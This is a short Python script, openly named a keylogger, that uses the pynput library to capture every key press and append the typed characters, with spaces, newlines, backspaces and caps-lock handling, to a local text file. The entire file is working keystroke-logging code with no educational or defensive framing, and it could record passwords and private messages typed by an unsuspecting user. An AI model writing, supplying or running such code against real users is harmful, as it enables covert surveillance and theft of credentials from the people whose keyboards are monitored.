from pynput import keyboard

class Keylogger:

    def __init__(self):
        self.caps = False

    def keyPressed(self, key):
        with open("keyfile.txt", 'a') as logkey:
            try:
                char = key.char
                print(str(key))
                if self.caps == True:
                    char = char.upper()
                logkey.write(char)
            except:
                if key == keyboard.Key.space:
                    logkey.write(' ')
                elif key == keyboard.Key.enter:
                    logkey.write('\n')
                elif key == keyboard.Key.backspace:
                    logkey.write('\b')
                elif key == keyboard.Key.caps_lock:
                    if self.caps == False:
                        self.caps = True
                    else:
                        self.caps = False

if __name__ == "__main__":
    logger = Keylogger()
    listener = keyboard.Listener(on_press = logger.keyPressed)
    listener.start()
    input()
